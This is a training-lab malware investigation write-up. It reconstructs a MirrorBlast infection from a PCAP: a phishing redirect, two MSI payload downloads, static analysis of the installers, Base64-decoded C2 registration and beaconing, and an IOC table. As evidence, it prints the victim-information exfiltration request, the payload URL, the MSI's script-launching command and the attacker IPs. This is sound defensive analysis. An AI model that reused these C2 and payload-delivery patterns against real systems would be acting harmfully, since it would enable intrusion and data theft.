# MirrorBlast Malware Investigation
### Network Traffic Analysis & Command-and-Control Investigation

## 1. Project Overview

This project documents a network traffic investigation of a MirrorBlast malware infection using a provided PCAP file.

The investigation focuses on reconstructing the infection chain by examining suspicious HTTP traffic, identifying malware payload downloads, inspecting MSI installer contents, analysing encoded system information, and investigating command-and-control (C2) communication.

The objective was to understand how the compromised machine communicated with external infrastructure and identify the activities associated with the infection using available network evidence.

## 2. Investigation Objectives

- Identify the initial suspicious network activity and phishing redirection.
- Trace the delivery of malware payloads.
- Extract and examine downloaded MSI installers.
- Identify the files and installation paths defined by the installers.
- Analyse information transmitted by the compromised host.
- Investigate repeated communication with suspected C2 infrastructure.
- Reconstruct the observed infection sequence.

## 3. Investigation Environment

| Component | Details |
|---|---|
| Operating system | Kali Linux |
| Network analysis tool | Wireshark |
| Evidence source | Zone1.pcap |
| MSI analysis | msitools |
| Additional utilities | Linux command-line tools, Base64 decoder |

**Primary tools used:**

- **Wireshark:** Network traffic inspection, HTTP analysis and TCP stream investigation.
- **msitools:** MSI database inspection and extraction.
- **Linux command-line utilities:** File identification, extraction and static inspection.
- **Base64:** Decoding encoded information transmitted in HTTP requests.

## 4. Initial Access: Phishing Redirection

The investigation began with suspicious HTTP traffic originating from the victim machine, `172.16.1.102`.

The machine made a GET request to `feedproxy.google.com`, which returned an HTTP 301 redirect to:

`dzikics-my-sharepoint.com`

The destination domain used a SharePoint-like naming convention and URL structure, suggesting an attempt to impersonate Microsoft's SharePoint service.

This identified a suspicious redirection in the initial infection chain.

**Evidence:**

<img width="1492" height="596" alt="01-phishing-redirect" src="https://github.com/user-attachments/assets/e41c8015-13fa-426d-a5aa-b377e9ae27d2" />

## 5. Malware Payload Delivery

Following the initial redirection, the victim communicated with multiple external IP addresses involved in the payload delivery process.

### 5.1 First-stage payload: filter.msi

The victim established an HTTP connection with:

`185.10.68.235`

The server returned an HTTP 200 response containing an MSI installer.

Relevant response headers included:

- Filename: `filter.msi`
- Content-Type: `application/x-msi`
- Content-Length: `188416` bytes

The installer was subsequently exported from the HTTP traffic for further examination.

**Evidence:**

![First MSI download](https://github.com/user-attachments/assets/55a61fdf-2e5c-4dc2-adad-5aae5bcb57d4)

### 5.2 Victim information and staging server

The victim subsequently communicated with another external endpoint:

`185.183.96.147`

The HTTP request contained identifying information about the compromised machine in its query string:

`GET /?data=STOCKITFORUS:DESKTOP-6RXUZ74.stockitforus.net:dwight.morales`

The information included:

- Domain: `STOCKITFORUS`
- Hostname: `DESKTOP-6RXUZ74`
- Username: `dwight.morales`

The server responded with a URL pointing to the second MSI:

`http://192.36.27.92/10opd3r_load.msi`

This suggests that the endpoint was used as a staging or coordination server, receiving victim information and providing the location of the next payload.

**Evidence:**

![Victim information](https://github.com/user-attachments/assets/2bd2b7f2-fa35-4702-96af-bfd8a184a299)

### 5.3 Second-stage payload: 10opd3r_load.msi

The victim then established an HTTP connection with:

`192.36.27.92`

The server successfully delivered another MSI installer.

Relevant response details:

- Filename: `10opd3r_load.msi`
- Content-Type: `application/x-msi`
- Content-Length: `561152` bytes

This established a multi-stage payload delivery sequence involving two separate MSI downloads.

**Evidence:**

![Second MSI download](https://github.com/user-attachments/assets/d7fba689-0861-485e-8f1a-452824a76fd8)

## 6. MSI Static Analysis

After extracting both MSI installers from the network traffic, I used `msitools` in Kali Linux to inspect their internal database tables and installation instructions.

The analysis focused on the `File`, `Directory` and `CustomAction` tables.

### 6.1 Analysis of filter.msi

The first installer contained two files:

| Filename | File size |
|---|---:|
| arab.bin | 261 bytes |
| arab.exe | 294,912 bytes |

The MSI's Directory table identified the installation directory as:

`C:\ProgramData\001\`

The CustomAction table contained an action referencing:

- Executable: `arab.exe`
- Target: `C:\ProgramData\001\arab.bin`

This indicates that the installer was configured to use `arab.exe` with `arab.bin` as an argument or target.

The installer also contained references to WKIX32, associated with the KiXtart scripting environment.

The static analysis identified the files and execution instructions packaged in the installer, although it did not establish whether installation or execution succeeded on the victim.

**Evidence — MSI contents and custom action:**

![First MSI analysis](https://github.com/user-attachments/assets/4d398ae0-086e-4644-a903-6832097b4746)

**Evidence — Installation directory:**

<img width="762" height="217" alt="09-first-msi-installation-directory" src="https://github.com/user-attachments/assets/f8015ff7-1901-41f7-bac1-62e774054b23" />

### 6.2 Analysis of 10opd3r_load.msi

The second installer contained two files:

| Filename | Installed filename |
|---|---|
| exemple.rb | exemple.rb |
| rebol_view_278_3_1.exe | rebol-view-278-3-1.exe |

The MSI's Directory table identified the installation directory as:

`C:\ProgramData\Local\Google\`

The CustomAction table revealed the following execution command:

`rebol_view_278_3_1.exe -w -i -s C:/ProgramData/Local/Google/exemple.rb`

This indicates that the installer was configured to launch the REBOL executable with `exemple.rb` as its script.

The MSI also contained metadata identifying itself as Google Chrome version 92.0.4515.107, with Google listed as the author.

However, its contents revealed a REBOL interpreter and associated script rather than a normal Chrome installation.

This suggests the installer was masquerading as legitimate Google Chrome software.

**Evidence — MSI contents and custom action:**

![Second MSI analysis](https://github.com/user-attachments/assets/6b049787-4df0-4653-bc7a-20374ba65212)

**Evidence — Installation directory:**

<img width="727" height="234" alt="10-second-msi-installation-directory" src="https://github.com/user-attachments/assets/058530e1-d1d8-4fed-b364-a3698e2918dd" />

## 7. Command-and-Control Investigation

After the payload delivery activity, the compromised machine began communicating with another external endpoint:

**C2 IP:** `169.239.128.11`  
**Associated hostname:** `fidufagios.com`

The HTTP traffic contained a distinctive User-Agent:

`REBOL View 2.7.8.3.1`

### 7.1 Initial C2 registration and system reconnaissance

The victim initially sent a GET request to:

`/r?x=...`

The query parameter contained Base64-encoded information.

After decoding, the transmitted information was:

```text
name=STOCKITFORUS\dwight.morales
os=10.0
arch=x86
build=1.0.2
```

This revealed identifying information about the compromised machine, including its domain username, operating system, architecture and build information.

The C2 server responded with:

```text
1|f327b5b7-65ea-4f57-b323-a278f1637fb8
```

The returned UUID was subsequently included in repeated requests to the same server.

This activity is consistent with initial C2 registration and host profiling.

**Evidence:**

![C2 registration](https://github.com/user-attachments/assets/39fae247-6ebf-4c34-a14d-8a269026ac16)

### 7.2 Repeated C2 communication and beaconing

Following the initial registration, the victim repeatedly communicated with the C2 server using HTTP GET requests to two observed endpoints:

- `/m`
- `/p`

The requests contained the UUID assigned during the initial registration.

The repeated requests and corresponding server responses were consistent with periodic C2 check-ins, commonly referred to as beaconing.

The exact purpose of the `/m` and `/p` endpoints could not be established from the PCAP alone. However, the repeated communication demonstrates ongoing interaction between the compromised host and the external server.

**Evidence:**

![C2 beaconing](https://github.com/user-attachments/assets/0d9842e7-4974-4a12-9127-f1734f1c4716)

## 8. Infection Timeline

The following timeline summarizes the main activities observed in the PCAP.

| Date and time (UTC) | Activity |
|---|---|
| 05 Oct 2021, 22:37:32 | Victim requests a URL through Google FeedProxy and receives a redirect to a SharePoint-lookalike domain. |
| 05 Oct 2021, 22:38:10 | First MSI download from `185.10.68.235`. |
| 05 Oct 2021, 22:38:12 | Victim sends identifying information to `185.183.96.147`. |
| 05 Oct 2021, 22:38:12 | Staging server provides the URL for the second MSI. |
| 05 Oct 2021, 22:38:12 | Second MSI download from `192.36.27.92`. |
| 05 Oct 2021, 22:42:03 | Initial C2 registration request to `169.239.128.11`. |
| Following registration | Repeated HTTP requests to the C2 server using the assigned UUID. |

*Times are based on timestamps observed in the PCAP.*

## 9. Indicators of Compromise (IOCs)

The following indicators were identified during the investigation.

| Indicator | Value | Context |
|---|---|---|
| Victim IP | `172.16.1.102` | Compromised host |
| Redirect domain | `dzikics-my-sharepoint.com` | SharePoint-lookalike destination |
| First payload IP | `185.10.68.235` | Delivered `filter.msi` |
| Staging server IP | `185.183.96.147` | Received victim information and returned second payload URL |
| Second payload IP | `192.36.27.92` | Delivered `10opd3r_load.msi` |
| C2 IP | `169.239.128.11` | Repeated C2 communication |
| C2 hostname | `fidufagios.com` | Hostname observed in C2 traffic |
| First MSI | `filter.msi` | Initial installer |
| Second MSI | `10opd3r_load.msi` | Second-stage installer |
| C2 User-Agent | `REBOL View 2.7.8.3.1` | Observed during C2 communication |

*These indicators are specific to the investigated PCAP and should be treated as historical investigation evidence, not as independently verified current threat intelligence.*

## 10. Key Findings

The investigation established the following:

1. The victim communicated with a URL that redirected to a SharePoint-lookalike domain.
2. Two MSI installers were delivered from separate external IP addresses.
3. An additional external endpoint received identifying information about the victim and returned the URL for the second payload.
4. Static analysis of the first MSI revealed `arab.exe` and `arab.bin`, with an associated custom action.
5. Static analysis of the second MSI revealed a REBOL executable and script, with an installation instruction that launches the script.
6. The compromised host transmitted system information to an external C2 endpoint during initial registration.
7. Repeated communication with the C2 server was consistent with beaconing.

## 11. Investigation Limitations

This investigation was primarily based on network traffic analysis and static examination of MSI installers.

The following limitations should be considered:

- The PCAP shows the redirection but does not independently prove the victim's exact interaction with the phishing page.
- MSI metadata and custom actions describe intended installation and execution behaviour, not necessarily successful execution.
- The actual behaviour of the extracted malware components was not fully reverse-engineered.
- The exact purpose of the C2 `/m` and `/p` endpoints could not be confirmed.
- The PCAP alone cannot establish whether additional activity occurred outside the captured timeframe.
- Threat actor attribution was not independently established through this investigation.

These limitations distinguish directly observed evidence from behavioural interpretations.

## 12. Conclusion

This investigation reconstructed a multi-stage MirrorBlast-associated infection sequence using network traffic analysis and static examination of downloaded MSI installers.

The analysis identified an initial phishing redirection, two-stage payload delivery, victim information collection, suspicious installer execution instructions and repeated communication with an external C2 server.

By combining Wireshark traffic analysis with MSI database inspection and Base64 decoding, I was able to move beyond identifying suspicious IP addresses and reconstruct the sequence of activities observed in the compromised environment.

The investigation strengthened my practical understanding of HTTP traffic analysis, payload investigation, C2 communication, static analysis and evidence-based incident reconstruction.

---

**Project type:** Network Traffic Analysis / Malware Investigation  
**Environment:** TryHackMe training lab  
**Primary tools:** Wireshark, Kali Linux, msitools
